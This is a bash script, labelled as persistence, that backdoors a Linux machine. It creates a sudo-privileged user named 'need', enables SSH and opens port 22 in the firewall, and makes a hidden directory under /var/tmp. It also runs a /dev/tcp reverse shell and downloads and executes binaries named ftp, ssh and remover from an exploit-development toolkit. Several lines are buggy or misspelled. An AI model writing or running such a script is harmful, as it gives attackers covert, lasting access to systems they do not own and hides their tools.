#!/bin/bash

var=0
sbin="cd /sbin/"
sshd="service sshd start && sudo systemctl enable sshd"
useradd="sudo useradd need"
usermod="sudo usermod -aG sudo need"
groupadd="sudo groupadd root"
gpasswd="sudo gpasswd -A need root"
su="su need"
openSsh="sudo apt install openssh-client && sudo apt install openssh-server"
firewall="ufo allow sh"
systemctl="sudo systemctl enable ssh"
openSsh1="sudo ufw allow OpenSSH"
openport="sudo ufw allow 22"
mkdir="mkdir /var/tmp/.secret && cd /var/tmp/.secret"
revShell=" /bin/bash -i > /dev/tcp/127.0.0.1/8080 0<&1 2>&1"
wget="wget -o /dev/null https://github.com/NEED-Programming/Exploit-Development/blob/master/toolkit/ftp"
pivot="chmod +x ftp && ./ftp"
wget1="wget -o /dev/null https://github.com/NEED-Programming/Exploit-Development/blob/master/toolkit/ssh"
pivot="chmod +x ssh"
wget2="wget -o /dev/null https://github.com/NEED-Programming/Exploit-Development/blob/master/toolkit/remover"
pivot="chmod +x remover"

#persistence
if [ $var -eq 0 ]
then
	$sbin
	sleep 1
	$sshd
	sleep 1
	$useradd
	sleep 1
	$usermod
	sleep 1
	$groupadd
	sleep 1
	$gpasswd
	sleep 1
	$su
	sleep 1
	$openSsh
	sleep 1
	$firewall
	sleep 1
	$systemctl
	sleep 1
	$openSsh1
	sleep 1
	$openport
	sleep 1
	$mkdir
	sleep 1
	$revShell
	sleep 1
	$wget1
	sleep 1
	$wget2
	sleep 1
	$pivot
	sleep 1
fi
